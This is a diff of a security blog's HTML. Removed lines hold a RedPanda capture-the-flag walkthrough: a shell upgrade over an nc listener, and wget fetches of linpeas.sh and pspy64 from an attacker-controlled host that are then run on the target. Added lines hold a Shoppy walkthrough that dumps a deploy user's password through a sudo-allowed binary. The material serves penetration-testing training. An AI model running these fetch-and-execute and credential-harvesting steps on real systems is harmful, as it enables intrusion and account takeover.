+</div><h2 id="privilage-escalation">Privilage Escalation</h2>
+<h3 id="sudo--l">Sudo -l</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -757,237 +640,28 @@ slug = &quot;&quot;</p>
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-</span></span><span class="line"><span class="cl">woodenk@redpanda:/tmp/hsperfdata_woodenk$ ^Z
-</span></span><span class="line"><span class="cl">zsh: suspended  nc -nlvp <span class="m">4444</span>          
-</span></span><span class="line"><span class="cl">└─$  stty raw -echo <span class="p">;</span> <span class="nb">fg</span> 
-</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + continued  nc -nlvp <span class="m">4444</span>
-</span></span><span class="line"><span class="cl">woodenk@redpanda:/tmp/hsperfdata_woodenk$
-</span></span><span class="line"><span class="cl">woodenk@redpanda:/tmp/hsperfdata_woodenk$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Now, You have the most interactive shell you can have with auto-complete and no interruptions.</p>
-<p>Back to our mission, Let&rsquo;s go and grap the user.txt.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">woodenk@redpanda:/home/woodenk$ cat user.txt
-</span></span><span class="line"><span class="cl">74e9066ca96ac03b9eXXXXXXXXXXXXX
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="post-exploitation">Post-Exploitation</h2>
-<h3 id="linpeassh">linpeas.sh</h3>
-<p>Firstly, We initialize a Python server in order to send <strong>linpeas.sh</strong> to the victim machine.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python3 -m http.server <span class="m">9000</span>
-</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">9000</span> <span class="o">(</span>http://0.0.0.0:9000/<span class="o">)</span> ...
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Then, At the victim machine we go the <strong>/tmp</strong> folder and download the script.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">woodenk@redpanda:/tmp/hsperfdata_woodenk$ wget http://10.10.16.34:9000/linpeas.sh
-</span></span><span class="line"><span class="cl">--2022-11-15 18:12:02--  http://10.10.16.34:9000/linpeas.sh
-</span></span><span class="line"><span class="cl">Connecting to 10.10.16.34:9000... connected.
-</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... <span class="m">200</span> OK
-</span></span><span class="line"><span class="cl">Length: <span class="m">827827</span> <span class="o">(</span>808K<span class="o">)</span> <span class="o">[</span>text/x-sh<span class="o">]</span>
-</span></span><span class="line"><span class="cl">Saving to: ‘linpeas.sh’
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jaeger@shoppy:~$ sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> jaeger: 
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> jaeger on shoppy:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">linpeas.sh          100%<span class="o">[===================</span>&gt;<span class="o">]</span> 808.42K   240KB/s    in 3.4s    
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">2022-11-15 18:12:06 <span class="o">(</span><span class="m">240</span> KB/s<span class="o">)</span> - ‘linpeas.sh’ saved <span class="o">[</span>827827/827827<span class="o">]</span>
-</span></span><span class="line"><span class="cl">woodenk@redpanda:/tmp/hsperfdata_woodenk$ chmod +x linpeas.sh 
-</span></span><span class="line"><span class="cl">woodenk@redpanda:/tmp/hsperfdata_woodenk$ ./linpeas.sh
+</span></span><span class="line"><span class="cl">User jaeger may run the following commands on shoppy:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>deploy<span class="o">)</span> /home/deploy/password-manager
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Apparently, Nothing i have got from <strong>linpeas.sh</strong>.</p>
-<h3 id="id">id</h3>
-<p>So, by looking at the result of  the <strong>id</strong> command, We can see that we are belonging to a group called <strong>logs</strong>!</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">woodenk@redpanda:/tmp/hsperfdata_woodenk$ id
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>woodenk<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>logs<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>logs<span class="o">)</span>,1000<span class="o">(</span>woodenk<span class="o">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Which is very interesting because we dont know what is this group and maybe it is our way to get the <strong>root</strong> privilage.</p>
-<p>So, Let&rsquo;s find everything under the permission of that group:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">woodenk@redpanda:/tmp/hsperfdata_woodenk$ find / -group logs 2&gt;/dev/null
-</span></span><span class="line"><span class="cl">/opt/panda_search/redpanda.log
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Let&rsquo;s run <strong>pspy64</strong> and see what processes are running in the background.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">woodenk@redpanda:/tmp$ wget 10.10.16.34:9000/pspy64
-</span></span><span class="line"><span class="cl">--2022-11-16 14:23:41--  http://10.10.X.X:9000/pspy64
-</span></span><span class="line"><span class="cl">Connecting to 10.10.16.34:9000... connected.
-</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... <span class="m">200</span> OK
-</span></span><span class="line"><span class="cl">Length: <span class="m">4468984</span> <span class="o">(</span>4.3M<span class="o">)</span> <span class="o">[</span>application/octet-stream<span class="o">]</span>
-</span></span><span class="line"><span class="cl">Saving to: ‘pspy64’
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">pspy64              100%<span class="o">[===================</span>&gt;<span class="o">]</span>   4.26M   268KB/s    in 16s     
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">2022-11-16 14:23:57 <span class="o">(</span><span class="m">275</span> KB/s<span class="o">)</span> - ‘pspy64’ saved <span class="o">[</span>4468984/4468984<span class="o">]</span>
-</span></span><span class="line"><span class="cl">woodenk@redpanda:/tmp/hsperfdata_woodenk$ chmod +x pspy64 
-</span></span><span class="line"><span class="cl">woodenk@redpanda:/tmp/hsperfdata_woodenk$ ./pspy64
-</span></span><span class="line"><span class="cl">---------------------------------------------------------------------
-</span></span><span class="line"><span class="cl">2022/11/16 14:26:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>    <span class="nv">PID</span><span class="o">=</span><span class="m">7093</span>   <span class="p">|</span> java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
-</span></span><span class="line"><span class="cl">---------------------------------------------------------------------
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>There is a <strong>JAR</strong> file being executed as <strong>root (UID=0)</strong>, Which i have to investigate about and see what is does.</p>
-<p>Let&rsquo;s transfer it to our attacker machine and see how does it work?</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ wget http://redpanda.htb:9000/final-1.0-jar-with-dependencies.jar                      
-</span></span><span class="line"><span class="cl">--2022-11-16 09:33:00--  http://redpanda.htb:9000/final-1.0-jar-with-dependencies.jar
-</span></span><span class="line"><span class="cl">Resolving redpanda.htb <span class="o">(</span>redpanda.htb<span class="o">)</span>... 10.10.11.170
-</span></span><span class="line"><span class="cl">Connecting to redpanda.htb <span class="o">(</span>redpanda.htb<span class="o">)</span><span class="p">|</span>10.10.11.170<span class="p">|</span>:9000... connected.
-</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... <span class="m">200</span> OK
-</span></span><span class="line"><span class="cl">Length: <span class="m">1280956</span> <span class="o">(</span>1.2M<span class="o">)</span> <span class="o">[</span>application/java-archive<span class="o">]</span>
-</span></span><span class="line"><span class="cl">Saving to: ‘final-1.0-jar-with-dependencies.jar’
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">final-1.0-jar-with-dependenci 100%<span class="o">[===============================================</span>&gt;<span class="o">]</span>   1.22M   714KB/s    in 1.8s    
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">2022-11-16 09:33:02 <span class="o">(</span><span class="m">714</span> KB/s<span class="o">)</span> - ‘final-1.0-jar-with-dependencies.jar’ saved <span class="o">[</span>1280956/1280956<span class="o">]</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>I have used a tool called <strong>&ldquo;jd-gui&rdquo;</strong> that is used to displays Java source codes.</p>
-<p>By running the JAR file called <strong>&ldquo;final-1.0-jar-with-dependencies.jar&rdquo;</strong> we can see in the <strong>main()</strong> class:</p>
-<p><img src="/post/RedPanda_HTB/imgs/RedPanda/14.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="jar"
-	
-	
-></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">JDOMException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">JpegProcessingException</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">File</span> <span class="n">log_fd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">&#34;/opt/panda_search/redpanda.log&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Scanner</span> <span class="n">log_reader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">log_fd</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="o">(</span><span class="n">log_reader</span><span class="o">.</span><span class="na">hasNextLine</span><span class="o">())</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">line</span> <span class="o">=</span> <span class="n">log_reader</span><span class="o">.</span><span class="na">nextLine</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="o">(!</span><span class="n">isImage</span><span class="o">(</span><span class="n">line</span><span class="o">))</span>
-</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="o">;</span> 
-</span></span><span class="line"><span class="cl">      <span class="n">Map</span> <span class="n">parsed_data</span> <span class="o">=</span> <span class="n">parseLog</span><span class="o">(</span><span class="n">line</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">parsed_data</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;uri&#34;</span><span class="o">));</span>
-</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">artist</span> <span class="o">=</span> <span class="n">getArtist</span><span class="o">(</span><span class="n">parsed_data</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;uri&#34;</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
-</span></span><span class="line"><span class="cl">      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Artist: &#34;</span> <span class="o">+</span> <span class="n">artist</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">xmlPath</span> <span class="o">=</span> <span class="s">&#34;/credits/&#34;</span> <span class="o">+</span> <span class="n">artist</span> <span class="o">+</span> <span class="s">&#34;_creds.xml&#34;</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">      <span class="n">addViewTo</span><span class="o">(</span><span class="n">xmlPath</span><span class="o">,</span> <span class="n">parsed_data</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;uri&#34;</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span> 
-</span></span><span class="line"><span class="cl">  <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We can see that the <strong>redpanda.log</strong> file will be read line by line and there are some conditions for the image to be passed:</p>
-<ol>
-<li>The line must contain <strong>.jpg</strong> as the extension of the image.</li>
-</ol>
-<div class="highlight"><div class="chroma">
+</div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">isImage</span><span class="o">(</span><span class="n">String</span> <span class="n">filename</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">filename</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;.jpg&#34;</span><span class="o">))</span>
-</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="kc">true</span><span class="o">;</span> 
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jaeger@shoppy:~$ cat /home/deploy/password-manager
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !
 </span></span></code></pre></td></tr></table>
 </div>
-</div><ol start="2">
-<li>The line will be splitted with the delimiter as &ldquo;<strong>||</strong>&rdquo; and the below attributes will be set to each part of the line.</li>
-</ol>
-<div class="highlight"><div class="chroma">
+</div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -996,284 +670,18 @@ slug = &quot;&quot;</p>
 </span><span class="lnt">5
 </span><span class="lnt">6
 </span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="n">Map</span> <span class="nf">parseLog</span><span class="o">(</span><span class="n">String</span> <span class="n">line</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">String</span><span class="o">[]</span> <span class="n">strings</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">&#34;\\|\\|&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;status_code&#34;</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">strings</span><span class="o">[</span><span class="n">0</span><span class="o">])));</span>
-</span></span><span class="line"><span class="cl">    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;ip&#34;</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="n">1</span><span class="o">]);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;user_agent&#34;</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="n">2</span><span class="o">]);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;uri&#34;</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="n">3</span><span class="o">]);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">map</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
+</span></span><span class="line"><span class="cl">Welcome to Josh password manager!
+</span></span><span class="line"><span class="cl">Please enter your master password: Sample
+</span></span><span class="line"><span class="cl">Access granted! Here is creds !
+</span></span><span class="line"><span class="cl">Deploy Creds :
+</span></span><span class="line"><span class="cl">username: deploy
+</span></span><span class="line"><span class="cl">password: Deploying@pp!
 </span></span></code></pre></td></tr></table>
 </div>
-</div><ol start="3">
-<li>The Author&rsquo;s tag metadata of the image file must be matched with <strong><code>/credits/&lt;author_name&gt;_creds.xml</code></strong></li>
-</ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">getArtist</span><span class="o">(</span><span class="n">String</span> <span class="n">uri</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">JpegProcessingException</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">fullpath</span> <span class="o">=</span> <span class="s">&#34;/opt/panda_search/src/main/resources/static&#34;</span> <span class="o">+</span> <span class="n">uri</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">File</span> <span class="n">jpgFile</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">fullpath</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Metadata</span> <span class="n">metadata</span> <span class="o">=</span> <span class="n">JpegMetadataReader</span><span class="o">.</span><span class="na">readMetadata</span><span class="o">(</span><span class="n">jpgFile</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">Directory</span> <span class="n">dir</span> <span class="o">:</span> <span class="n">metadata</span><span class="o">.</span><span class="na">getDirectories</span><span class="o">())</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="o">(</span><span class="n">Tag</span> <span class="n">tag</span> <span class="o">:</span> <span class="n">dir</span><span class="o">.</span><span class="na">getTags</span><span class="o">())</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">tag</span><span class="o">.</span><span class="na">getTagName</span><span class="o">()</span> <span class="o">==</span> <span class="s">&#34;Artist&#34;</span><span class="o">)</span>
-</span></span><span class="line"><span class="cl">          <span class="k">return</span> <span class="n">tag</span><span class="o">.</span><span class="na">getDescription</span><span class="o">();</span> 
-</span></span><span class="line"><span class="cl">      <span class="o">}</span> 
-</span></span><span class="line"><span class="cl">    <span class="o">}</span> 
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s">&#34;N/A&#34;</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">  <span class="o">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ol start="4">
-<li>The image file must be in a folder that has a WRITE access such as <strong>/tmp</strong></li>
-</ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">addViewTo</span><span class="o">(</span><span class="n">String</span> <span class="n">path</span><span class="o">,</span> <span class="n">String</span> <span class="n">uri</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">JDOMException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">SAXBuilder</span> <span class="n">saxBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SAXBuilder</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">XMLOutputter</span> <span class="n">xmlOutput</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XMLOutputter</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">xmlOutput</span><span class="o">.</span><span class="na">setFormat</span><span class="o">(</span><span class="n">Format</span><span class="o">.</span><span class="na">getPrettyFormat</span><span class="o">());</span>
-</span></span><span class="line"><span class="cl">    <span class="n">File</span> <span class="n">fd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">saxBuilder</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="n">fd</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Element</span> <span class="n">rootElement</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="na">getRootElement</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">Element</span> <span class="n">el</span> <span class="o">:</span> <span class="n">rootElement</span><span class="o">.</span><span class="na">getChildren</span><span class="o">())</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="o">(</span><span class="n">el</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">==</span> <span class="s">&#34;image&#34;</span><span class="o">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">el</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">&#34;uri&#34;</span><span class="o">).</span><span class="na">getText</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">uri</span><span class="o">))</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">          <span class="n">Integer</span> <span class="n">totalviews</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">rootElement</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">&#34;totalviews&#34;</span><span class="o">).</span><span class="na">getText</span><span class="o">())</span> <span class="o">+</span> <span class="n">1</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">          <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Total views:&#34;</span> <span class="o">+</span> <span class="n">Integer</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">totalviews</span><span class="o">.</span><span class="na">intValue</span><span class="o">()));</span>
-</span></span><span class="line"><span class="cl">          <span class="n">rootElement</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">&#34;totalviews&#34;</span><span class="o">).</span><span class="na">setText</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">totalviews</span><span class="o">.</span><span class="na">intValue</span><span class="o">()));</span>
-</span></span><span class="line"><span class="cl">          <span class="n">Integer</span> <span class="n">views</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">el</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">&#34;views&#34;</span><span class="o">).</span><span class="na">getText</span><span class="o">()));</span>
-</span></span><span class="line"><span class="cl">          <span class="n">el</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">&#34;views&#34;</span><span class="o">).</span><span class="na">setText</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">views</span><span class="o">.</span><span class="na">intValue</span><span class="o">()</span> <span class="o">+</span> <span class="n">1</span><span class="o">));</span>
-</span></span><span class="line"><span class="cl">        <span class="o">}</span>  
-</span></span><span class="line"><span class="cl">    <span class="o">}</span> 
-</span></span><span class="line"><span class="cl">    <span class="n">BufferedWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedWriter</span><span class="o">(</span><span class="k">new</span> <span class="n">FileWriter</span><span class="o">(</span><span class="n">fd</span><span class="o">));</span>
